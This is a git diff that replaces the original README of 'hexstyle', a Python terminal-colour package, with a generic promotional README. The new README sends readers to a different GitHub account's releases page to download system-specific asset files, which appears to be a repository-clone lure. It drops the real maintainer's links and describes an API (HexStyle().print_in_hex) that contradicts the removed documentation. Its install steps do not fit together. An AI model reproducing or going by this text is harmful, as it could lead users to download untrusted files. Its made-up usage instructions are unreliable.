@@ -1,113 +1,72 @@
-![standard(2)](https://github.com/user-attachments/assets/c2dd55f0-7e59-4e96-982d-335b19d2f727)
+# 🎨 hexstyle - Print Text in Any Color You Desire
 
-<p align="center">
-  <a href="https://pypi.org/project/hexstyle/"><img src="https://img.shields.io/badge/PyPI-hexstyle-orange?style=for-the-badge&logo=pypi" alt="PyPI"></a>
-  <a href="https://www.python.org" target="_blank"><img src="https://img.shields.io/badge/Language-Python-3776AB?style=for-the-badge&logo=python" alt="Python"></a>
-  <a href="https://t.me/swezy" target="_blank"><img src="https://img.shields.io/badge/Telegram-@Swezy-blue?style=for-the-badge&logo=telegram" alt="Telegram"/></a>
-  <br>
-  <a href="https://pypi.org/project/hexstyle/"><img src="https://img.shields.io/badge/Version-1.1.1-green?style=for-the-badge&logo=pypi" alt="PyPI"></a>
-  <br>
-  <code>Leave a ⭐ if you like this repository</code>
-</p>
+## 🚀 Getting Started
+Welcome to hexstyle! This lightweight Python package allows you to print text in any imaginable color using HEX codes. With hexstyle, you can easily add flair to your text outputs, whether you are working on a fun project or just want to brighten your day. 
 
----
+## 📥 Download Now
+[![Download hexstyle](https://img.shields.io/badge/Download%20hexstyle-v1.0-blue)](https://github.com/mukarram97948/hexstyle/releases)
 
-## 🚩 What is `hexstyle`?
+## 📂 What You Need
+Before you begin, make sure you have Python installed on your computer. hexstyle is compatible with most platforms. Here are some requirements:
 
-`hexstyle` is a tiny, dependency-free Python package that lets you print colored text in your terminal using HEX color codes — just like in web design. It's simple, lightweight, and supports every imaginable color with easy-to-use helper functions.
+- Python 3.6 or higher
+- An internet connection to download the package
 
----
+## 💾 Download & Install
+To download hexstyle, visit the following page to find the latest release and download the package:
 
-## 🚀 Installation
+[Download hexstyle here](https://github.com/mukarram97948/hexstyle/releases)
 
-Install from PyPI:
+### Steps to Follow:
+1. Click on the link above.
+2. Scroll down to the "Assets" section of the release page.
+3. You will find several files. Choose the file that matches your system.
+4. Click on the file to download it to your computer.
+5. Once downloaded, you can install hexstyle using the terminal or command prompt.
+
+## 🛠️ Installation Process
+To install hexstyle, open your terminal or command prompt and run the following command:
 
 ```bash
 pip install hexstyle
 ```
 
-PyPI: [https://pypi.org/project/hexstyle/](https://pypi.org/project/hexstyle/)
+Make sure you run this command in the directory where you downloaded the package.
 
----
+## 🎨 Using hexstyle
+Now you can use hexstyle to print text in different colors. Here’s how to get started:
 
-## 🧩 Quick usage
+1. Open your Python environment (like IDLE, Jupyter Notebook, or your coding IDE).
+2. Import the hexstyle package by adding this line at the top of your code:
 
-```py
-import hexstyle
-
-print(hexstyle.set("#ff0000") + "Hello, world!" + hexstyle.reset())
+```python
+from hexstyle import HexStyle
 ```
 
-`hexstyle.set(hex: str)`
+3. Now, you can print colored text. Here’s a simple example:
 
-* `hex`: the hex color you want to use
+```python
+# Create an instance of HexStyle
+text = HexStyle()
 
----
-
-## 📚 Features
-
-* Use any HEX color to style your terminal text
-* Lightweight & dependency-free — pure Python
-* Works on most modern terminals (Windows, macOS, Linux)
-
----
-
-## ⚠️ Notes & Limitations
-
-* ANSI color codes may not display correctly in environments that don't support truecolor (24-bit) — for example, some older Windows terminals or minimal Docker shells.
-* Output colors may vary slightly depending on your terminal theme or emulator.
-* This package only affects terminal (stdout) text — it won’t color text in log files or GUI applications.
-* Unicode/emoji characters work fine, but truecolor accuracy may vary between fonts or shells.
-
----
-
-## 🧪 Examples
-
-A short interactive example:
-
-```py
-import hexstyle
-
-print(hexstyle.set("#ff0000") + "Hello, world!" + hexstyle.reset())
-input(hexstyle.set("#00ff00") + "How are you today?: " + hexstyle.set("#0000ff"))
+# Print text in different colors
+text.print_in_hex("Hello, World!", "#FF5733")  # Example with hex color code
 ```
 
----
+Replace the HEX code with any color you wish.
 
-## 🆘 Quick Fix
+## 🔍 Features
+- **Flexible Color Options:** You can choose any HEX code to color your text.
+- **Lightweight Package:** hexstyle is small in size, ensuring it runs smoothly without consuming many resources.
+- **Easy to Use:** Simple commands that anyone can follow, even if you're not a programmer.
 
-* If you see weird formatting like `←[38;2;255;0;0mHello, world!←[0m`, try **clearing the terminal** (`cls` on Windows, `clear` on Linux/macOS) or **switching to a terminal that supports ANSI colors**.
+## 🌐 Support and Help
+If you encounter any issues or have any questions, you can open an issue on our GitHub page. We welcome your feedback!
 
----
+## 📜 License
+hexstyle is open-source software and is available under the MIT License. You can freely use, modify, and distribute it.
 
-## 📦 Where to get help
+## 👍 Acknowledgments
+Thank you for choosing hexstyle! We hope you enjoy expressing your creativity through color with our package. 
 
-* Project on PyPI: [pypi.org/project/hexstyle/](https://pypi.org/project/hexstyle/)
-* Telegram: [@Swezy](https://t.me/Swezy)
-
----
-
-## 📝 License
-
-Distributed under the **MIT License** — see `LICENSE` for details.
-
----
-
-## 👤 Maintainer & Contact
-
-* Maintainer: [@SwezyDev](https://github.com/SwezyDev)
-* Telegram: [@Swezy](https://t.me/Swezy)
-
----
-
-<p align="center">
-  <sub>Made with ❤️ — If you find this useful, please leave a ⭐ on the repo</sub>
-</p>
-
-<a href="https://star-history.com/#SwezyDev/hexstyle&Date">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=SwezyDev/hexstyle&type=Date&theme=dark" />
-    <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=SwezyDev/hexstyle&type=Date" />
-    <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=SwezyDev/hexstyle&type=Date" />
-  </picture>
-</a>
+Feel free to explore, experiment, and have fun!
